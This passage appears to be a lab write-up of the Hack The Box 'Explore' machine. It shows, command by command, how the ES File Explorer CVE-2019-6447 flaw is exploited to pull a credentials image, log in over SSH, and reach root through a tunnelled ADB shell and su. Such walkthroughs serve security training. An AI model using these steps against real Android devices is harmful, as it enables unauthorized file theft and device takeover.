<p><div class="img-container"><img src="imgs/image-20211030202819887.png" alt="image-20211030202819887"  /></div>
</p>
<p>If I use <code>nc</code>, port 59777 returns with a forbidden error message.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «explore» «10.10.14.83» 
$ nc 10.10.10.247 <span class="m">59777</span>
GET /
HTTP/1.0 <span class="m">403</span> Forbidden 
Content-Type: text/plain
Date: Sun, <span class="m">9</span> Jul <span class="m">2021</span> 22:32:42 GMT

FORBIDDEN: No directory listing
</code></pre></div><p>For port 42135, interacting with it from <code>nc</code> or the browser both returns 404 not found message.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «explore» «10.10.14.83» 
$ nc 10.10.10.247 <span class="m">42135</span>
GET / HTTP/1.1

HTTP/1.1 <span class="m">404</span> Not Found
Server: ES Name Response Server
Content-Type: text/html
Content-Length: <span class="m">9</span>
Connection: close

Not found
</code></pre></div><h4 id="finding-vulnerabilities">Finding Vulnerabilities</h4>
<p>On Exploit-DB, there is one recent exploit for ES File Explorer, which was released 3 days after this box. This looks promising,</p>
<p><div class="img-container"><img src="imgs/image-20210710054049723.png" alt="image-20210710054049723"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-kristi">Shell as kristi</h3>
<h4 id="es-file-explorer-cve-2019-6447">ES File Explorer CVE-2019-6447</h4>
<p>The arbitrary file read vulnerability on ES File Explorer 4.1.9.7.4 is classified as CVE-2019-6447. <a href="https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566">This articles</a> explains about the vulnerability, but I will just quote its overview part which states that:</p>
<blockquote>
<p>The ES file browser creates an HTTP service bound to port 59777 at runtime, which provides 10+ commands for accessing data in user’s cell  phone and executing the application; however, the service does not check this request. Test, resulting in a security breach.</p>
</blockquote>
<p>I can test for the vulnerability by sending a HTTP POST request containing one of the available commands like <code>getDeviceInfo</code> to <code>http://10.10.10.247:59777</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «explore» «10.10.14.83» 
$ curl -d <span class="s1">&#39;{&#34;command&#34;:&#34;getDeviceInfo&#34;}&#39;</span> http://10.10.10.247:59777   
<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;VMware Virtual Platform&#34;</span>, <span class="s2">&#34;ftpRoot&#34;</span>:<span class="s2">&#34;/sdcard&#34;</span>, <span class="s2">&#34;ftpPort&#34;</span>:<span class="s2">&#34;3721&#34;</span><span class="o">}</span>
</code></pre></div><p>And it was vulnerable!</p>
<p>This time I will grab this <a href="https://www.exploit-db.com/exploits/50070">exploit</a>. When sending <code>listPics</code>  command, it returns with one interesting file name called <code>creds.jpg</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.83» 
$ python3 esfile_cve2019-6447.py listPics 10.10.10.247

<span class="o">==================================================================</span>
<span class="p">|</span>    ES File Explorer Open Port Vulnerability : CVE-2019-6447    <span class="p">|</span>
<span class="p">|</span>                Coded By : Nehal a.k.a PwnerSec                 <span class="p">|</span>
<span class="o">==================================================================</span>

name : concept.jpg
<span class="nb">time</span> : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size : 135.33 KB <span class="o">(</span>138,573 Bytes<span class="o">)</span>

name : anc.png
<span class="nb">time</span> : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size : 6.24 KB <span class="o">(</span>6,392 Bytes<span class="o">)</span>

name : creds.jpg
<span class="nb">time</span> : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB <span class="o">(</span>1,200,401 Bytes<span class="o">)</span>

name : 224_anc.png
<span class="nb">time</span> : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size : 124.88 KB <span class="o">(</span>127,876 Bytes<span class="o">)</span>
</code></pre></div><p>The file can be downloaded with <code>getFile</code> command and then supply the file path as the last argument.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.83» 
$ python3 esfile_cve2019-6447.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg 

<span class="o">==================================================================</span>
<span class="p">|</span>    ES File Explorer Open Port Vulnerability : CVE-2019-6447    <span class="p">|</span>
<span class="p">|</span>                Coded By : Nehal a.k.a PwnerSec                 <span class="p">|</span>
<span class="o">==================================================================</span>

<span class="o">[</span>+<span class="o">]</span> Downloading file...
<span class="o">[</span>+<span class="o">]</span> Done. Saved as <span class="sb">`</span>out.dat<span class="sb">`</span>.
</code></pre></div><p>The saved image contains a set of creds: <code>kristi:Kr1sT!5h@Rp3xPl0r3!</code></p>
<p><div class="img-container"><img src="imgs/image-20210710055249731.png" alt="image-20210710055249731"  /></div>
</p>
<h4 id="ssh---kristi">SSH - Kristi</h4>
<p>These credentials works on SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.83» 
$ ssh -p <span class="m">2222</span> kristi@10.10.10.247
Password authentication
Password: 
:/ $ whoami <span class="o">&amp;&amp;</span> id <span class="o">&amp;&amp;</span> hostname
u0_a76
<span class="nv">uid</span><span class="o">=</span>10076<span class="o">(</span>u0_a76<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>10076<span class="o">(</span>u0_a76<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>10076<span class="o">(</span>u0_a76<span class="o">)</span>,3003<span class="o">(</span>inet<span class="o">)</span>,9997<span class="o">(</span>everybody<span class="o">)</span>,20076<span class="o">(</span>u0_a76_cache<span class="o">)</span>,50076<span class="o">(</span>all_a76<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>u:r:untrusted_app:s0:c76,c256,c512,c768
localhost
</code></pre></div><p>The username appeared as  <code>u0_a76</code> because each application on Android starting from OS 6.0+ is sandboxed. In this case the SSH server is a sandboxed application.</p>
<p>The user flag is on <code>/sdcard/user.txt</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">:/sdcard $ ls -la
total <span class="m">68</span>
drwxrwx--- <span class="m">15</span> root everybody <span class="m">4096</span> 2021-04-21 02:12 .
drwx--x--x  <span class="m">4</span> root everybody <span class="m">4096</span> 2021-03-13 17:16 ..
drwxrwx---  <span class="m">5</span> root everybody <span class="m">4096</span> 2021-03-13 17:30 .estrongs
-rw-rw----  <span class="m">1</span> root everybody   <span class="m">72</span> 2021-07-09 07:16 .userReturn
drwxrwx---  <span class="m">2</span> root everybody <span class="m">4096</span> 2021-03-13 17:16 Alarms
drwxrwx---  <span class="m">3</span> root everybody <span class="m">4096</span> 2021-03-13 17:16 Android
drwxrwx---  <span class="m">2</span> root everybody <span class="m">4096</span> 2021-04-21 02:38 DCIM
drwxrwx---  <span class="m">2</span> root everybody <span class="m">4096</span> 2021-03-13 17:37 Download
drwxrwx---  <span class="m">2</span> root everybody <span class="m">4096</span> 2021-03-13 17:16 Movies
drwxrwx---  <span class="m">2</span> root everybody <span class="m">4096</span> 2021-03-13 17:16 Music
drwxrwx---  <span class="m">2</span> root everybody <span class="m">4096</span> 2021-03-13 17:16 Notifications
drwxrwx---  <span class="m">2</span> root everybody <span class="m">4096</span> 2021-03-13 17:16 Pictures
drwxrwx---  <span class="m">2</span> root everybody <span class="m">4096</span> 2021-03-13 17:16 Podcasts
drwxrwx---  <span class="m">2</span> root everybody <span class="m">4096</span> 2021-03-13 17:16 Ringtones
drwxrwx---  <span class="m">3</span> root everybody <span class="m">4096</span> 2021-03-13 17:30 backups
drwxrwx---  <span class="m">2</span> root everybody <span class="m">4096</span> 2021-04-21 02:12 dianxinos
-rw-rw----  <span class="m">1</span> root everybody   <span class="m">33</span> 2021-03-13 18:28 user.txt
:/sdcard $ cat user.txt
f3201...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="adb">ADB</h4>
<p>While enumerating this machine, I found a <code>xbin</code> folder under <code>/system</code> directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">:/system $ ls -l
total <span class="m">212</span>
drwxr-xr-x <span class="m">41</span> root root    <span class="m">4096</span> 2020-03-25 00:26 app
drwxr-xr-x  <span class="m">3</span> root shell   <span class="m">8192</span> 2020-03-25 00:26 bin
-rw-------  <span class="m">1</span> root root    <span class="m">2824</span> 2020-03-24 23:39 build.prop
...<span class="o">[</span>SNIP<span class="o">]</span>...
drwxr-xr-x  <span class="m">2</span> root shell   <span class="m">8192</span> 2020-03-25 00:26 xbin
</code></pre></div><p>When I was an active XDA member (2011~2013), the existence of <code>/system/xbin</code> or <code>/system/xbin/su</code>  indicated that the device was rooted back then (I just found out that this method<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> is still used today).</p>
<p>Typically people who rooted their device has a debug mode enabled, therefore, I&rsquo;m guessing that the only way to gain a root shell from here is through <code>adb</code> (android debug bridge) on port 5555.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">:/ $ netstat -tlpn
Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program Name
tcp        <span class="m">0</span>      <span class="m">1</span> 10.10.10.247:60138      1.0.0.1:853             SYN_SENT    -
tcp        <span class="m">0</span>      <span class="m">1</span> 10.10.10.247:48216      1.1.1.1:853             SYN_SENT    -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::42135                :::*                    LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::59777                :::*                    LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> ::ffff:10.10.10.2:33035 :::*                    LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::2222                 :::*                    LISTEN      3405/net.xnano.android.sshserver
tcp6       <span class="m">0</span>      <span class="m">0</span> ::ffff:127.0.0.1:38415  :::*                    LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::5555                 :::*                    LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> ::ffff:127.0.0.1:5555   ::ffff:127.0.0.1:56602  ESTABLISHED -
tcp6       <span class="m">0</span>      <span class="m">0</span> ::ffff:127.0.0.1:56604  ::ffff:127.0.0.1:5555   ESTABLISHED 3405/net.xnano.android.sshserver
tcp6       <span class="m">0</span>      <span class="m">0</span> ::ffff:127.0.0.1:5555   ::ffff:127.0.0.1:56604  ESTABLISHED -
tcp6       <span class="m">0</span>    <span class="m">624</span> ::ffff:10.10.10.24:2222 ::ffff:10.10.14.2:55618 ESTABLISHED 3405/net.xnano.android.sshserver
tcp6       <span class="m">0</span>      <span class="m">0</span> ::ffff:127.0.0.1:56602  ::ffff:127.0.0.1:5555   ESTABLISHED 3405/net.xnano.android.sshserver
tcp6       <span class="m">0</span>      <span class="m">0</span> ::ffff:10.10.10.24:2222 ::ffff:10.10.14.2:55602 ESTABLISHED 3405/net.xnano.android.sshserver
</code></pre></div><p>As I only have ADB on my host device (Windows), I created two SSH tunnels: <code>Windows:5555 &lt;-SSH-&gt; Kali:5555 &lt;-SSH-&gt; Explorer:5555</code>.</p>
<p>On my Windows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ssh kali -L 5555:localhost:5555
</code></pre></div><p>On my Kali:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ssh -p <span class="m">2222</span> kristi@10.10.10.247 -L 5555:localhost:5555
</code></pre></div><p>Back on my Windows, I will connect to the Explore ADB server which is now accessible over port 5555 on my localhost.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">explore › adb tcpip <span class="m">5555</span>
* daemon not running<span class="p">;</span> starting now at tcp:5037
* daemon started successfully
restarting in TCP mode port: <span class="m">5555</span>
explore › adb connect localhost:5555
connected to localhost:5555
explore › adb devices
List of devices attached
localhost:5555  device
</code></pre></div><p>But it when I want to get a shell, it returns with</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">explore › adb shell
error: more than one device/emulator
</code></pre></div><p>and that can be resolved by specifying the device with <code>-s</code> option.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">explore › adb devices
List of devices attached
emulator-5554   device
localhost:5555  device

explore › adb -s localhost:5555 shell
x86_64:/ $ id
<span class="nv">uid</span><span class="o">=</span>2000<span class="o">(</span>shell<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>2000<span class="o">(</span>shell<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>2000<span class="o">(</span>shell<span class="o">)</span>,1004<span class="o">(</span>input<span class="o">)</span>,1007<span class="o">(</span>log<span class="o">)</span>,1011<span class="o">(</span>adb<span class="o">)</span>,1015<span class="o">(</span>sdcard_rw<span class="o">)</span>,1028<span class="o">(</span>sdcard_r<span class="o">)</span>,3001<span class="o">(</span>net_bt_admin<span class="o">)</span>,3002<span class="o">(</span>net_bt<span class="o">)</span>,3003<span class="o">(</span>inet<span class="o">)</span>,3006<span class="o">(</span>net_bw_stats<span class="o">)</span>,3009<span class="o">(</span>readproc<span class="o">)</span>,3011<span class="o">(</span>uhid<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>u:r:shell:s0
</code></pre></div><p>When I type <code>su</code>, I&rsquo;m in the root shell!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">x86_64:/ $ su
:/ <span class="c1"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>u:r:su:s0
</code></pre></div><p>The root flag can be found using the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">:/ <span class="c1"># find / -type f -name &#34;root.txt&#34; 2&gt;/dev/null</span>
/data/root.txt
:/ <span class="c1"># cat /data/root.txt</span>
f04fc...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p><a href="https://developer.android.com/studio/command-line/adb">https://developer.android.com/studio/command-line/adb</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p><a href="https://stackoverflow.com/questions/57588643/how-to-detect-whether-the-device-is-rooted-or-not">https://stackoverflow.com/questions/57588643/how-to-detect-whether-the-device-is-rooted-or-not</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</section>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
